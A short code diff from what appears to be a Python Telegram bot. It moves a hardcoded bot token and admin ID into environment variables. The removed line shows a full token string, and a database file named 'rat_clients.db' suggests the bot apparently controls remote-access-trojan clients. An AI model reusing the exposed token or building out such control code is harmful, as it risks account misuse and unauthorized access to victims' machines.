@@ -21,8 +21,8 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(level
 logger = logging.getLogger(__name__)
 
 # ВАШИ ДАННЫЕ (токен недействителен, создайте новый в @BotFather)
-BOT_TOKEN = "8730779650:AAEIjGdTEJHZT8Q24NFOdG7bbcqyOISvK9s"
-ADMIN_ID = 8722858929
+TOKEN = os.environ.get("TG_TOKEN")
+ADMIN_ID = os.environ.get("TG_ADMIN_ID")
 PORT = int(os.environ.get("PORT", 5000))
 DB_FILE = "rat_clients.db"
 
